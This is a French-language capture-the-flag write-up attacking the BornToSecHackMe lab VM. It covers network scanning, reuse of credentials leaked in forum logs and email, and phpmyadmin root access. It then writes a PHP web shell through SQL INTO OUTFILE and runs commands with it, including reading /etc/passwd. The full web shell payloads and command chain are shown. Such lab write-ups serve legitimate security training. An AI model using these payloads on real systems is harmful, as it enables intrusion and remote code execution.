# WRITEUP1

Après installation et lancement de la VM, on nous demande un mot de passe et l'adresse ip de la machine n'est pas indiqué.
On cherche a scanner un port ouvert part notre vm, pour cela, on configure le réseau de notre vm (sur VM box) en accès par pont.
On cherche à trouver une potentiel adresse ip créé par la VM  :

```bash
λ arp -a

Interface : 192.168.99.1 --- 0x6
  Adresse Internet      Adresse physique      Type
  192.168.99.255        ff-ff-ff-ff-ff-ff     statique
  ....

Interface : 192.168.1.26 --- 0x8
  Adresse Internet      Adresse physique      Type
  192.168.1.1           6c-ba-b8-be-0a-20     dynamique
  192.168.1.10          20-9a-7d-c0-45-d5     dynamique
  192.168.1.11          78-dd-12-93-0b-02     dynamique
  192.168.1.12          ec-b5-fa-31-6f-1f     dynamique
  192.168.1.13          48-ba-4e-c5-ce-7e     dynamique
  192.168.1.14          48-d6-d5-71-33-6d     dynamique
  192.168.1.15          42-e5-79-05-cc-33     dynamique
  192.168.1.16          84-b8-b8-04-7f-fb     dynamique
  192.168.1.17          e0-ac-cb-33-5b-bf     dynamique
  192.168.1.22          08-00-27-99-d9-06     dynamique
  224.0.0.250           01-00-5e-00-00-fa     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  224.0.1.60            01-00-5e-00-01-3c     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  239.255.255.251       01-00-5e-7f-ff-fb     statique
  ...

```

On peut également trouver l'adrese ip directement dans les configs du routeur.

On cherche maintenant a tester les différentes adresses de type `dynamique` avec la commande ping.
Plusieurs adresses répondes, on peut les essayer une part une avec `nmap` :

```bash
λ nmap 192.168.1.22 
Nmap scan report for IP (IP)
Host is up (0.0055s latency).
Not shown: 987 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
119/tcp open  nntp
143/tcp open  imap
443/tcp open  https
465/tcp open  smtps
563/tcp open  snews
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
```

L'adresse `192.168.1.22` dispose d'un site web qui nous affiche une page avec ecrit `HACK ME`. Après différents tests et quelques recherche on trouve différents moyen de découvrir des fails et d'autres pages accessibles.

Nous avons utilisez les `web scanner` `Arachni`, `dirb` et `nikto`, tous présent par défault sur l'os `kali` .

Nous allons travailler avec l'os `Kali` sur `wsl` à partir de maintenant car celui-ci inclut la plupart des outils de `Pen Testing` dont nous aurons besoin par la suite .

```bash
└─$ dirb https://192.168.1.22/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Sep  8 13:21:51 2021
URL_BASE: https://192.168.1.22/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.1.22/ ----
+ https://192.168.1.22/cgi-bin/ (CODE:403|SIZE:289)
==> DIRECTORY: https://192.168.1.22/forum/
==> DIRECTORY: https://192.168.1.22/phpmyadmin/
+ https://192.168.1.22/server-status (CODE:403|SIZE:294)
==> DIRECTORY: https://192.168.1.22/webmail/
```

Grace a ces `web scanner` on identifie de nouvelles pages accessibles : `/forum`, `/phpmyadmin`, `/webmail`.
Dans le post `Probleme login?` du forum, on peut voir des tentatives de connections avec différents nom d'user et ce qui ressemble a un mot de passe :

```bash
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Failed password for invalid user !q\\\]Ej?\*5K5cy\*AJ from 161.202.39.38 port 57764 ssh2  
Oct 5 08:45:29 BornToSecHackMe sshd\[7547\]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail \[preauth\]  
Oct 5 08:46:01 BornToSecHackMe CRON\[7549\]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

On reussi a se logger avec le nom d'user `lmezard` et le mot de passe `!q\\\]Ej?\*5K5cy\*AJ` au forum. Sur le profil de l'utilisateur on obtien l'adresse email de l'user : `laurie@borntosec.net`. On essaye de se logger sur `http://192.168.1.22/webmail` avec l'addresse email et le précédent mot de passe. On se connecte.
Un des emails de l'utilisateur nous donne un accès à la page `phpmyadmin` :  

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

phpmyadmin user: `root`
phpmyadmin password: `Fg-'kKXBj87E:aJ$`

Maintenant que l'on a un accès root à la db SQL, on cherche a faire une exploit appelé `web shell`. Grâce a `dirb` on peut obtenir une liste des dossiers utilisés par le site: 

```bash
└─$ dirb https://192.168.1.22/forum/

...

==> DIRECTORY: https://192.168.1.22/forum/js/
==> DIRECTORY: https://192.168.1.22/forum/lang/
==> DIRECTORY: https://192.168.1.22/forum/modules/
==> DIRECTORY: https://192.168.1.22/forum/templates_c/
==> DIRECTORY: https://192.168.1.22/forum/themes/
==> DIRECTORY: https://192.168.1.22/forum/update/

└─$ dirb https://192.168.1.22/webmail/

...

==> DIRECTORY: https://192.168.1.22/webmail/plugins/
==> DIRECTORY: https://192.168.1.22/webmail/src/
==> DIRECTORY: https://192.168.1.22/webmail/themes/
```

On cherche a obtenir le dossier par default du serveur web :

```bash
└─$ whatweb https://192.168.1.22/
https://192.168.1.22/ [404 Not Found] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.1.22], Title[404 Not Found]
```
Le serveur tourne sur Apache 2 donc `/var/www` pour le dossier par default.

On cherche a créé une nouvelle page qui nous permettera d'utiliser le `shell`. Pour cela on utilise la commande `
SELECT "<? system($_REQUEST['cmd']); ?>",2,3,4 INTO OUTFILE "/var/www/{folder}/{filename}.php" -- 1` avec les différents dossiers disponible pour en trouver un avec les droits d'écriture. On arrive a écrire notre fichier dans le dossier `templates_c`.

La requete sql pour créé notre fichier web_shell:

```sql
SELECT "<html><body><pre><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><?php if(isset($_GET['cmd'])){echo 'Shell: ';system($_GET['cmd']);}?></pre></body></html>" INTO OUTFILE '/var/www/forum/templates_c/web_shell.php'
```

une option simplifier sans le html pour curl :

```sql
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/curl_shell.php'
```

On recupère le nom de notre utilisateur:

```bash
└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=whoami
www-data
```

On liste les autres users:
```bash
└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

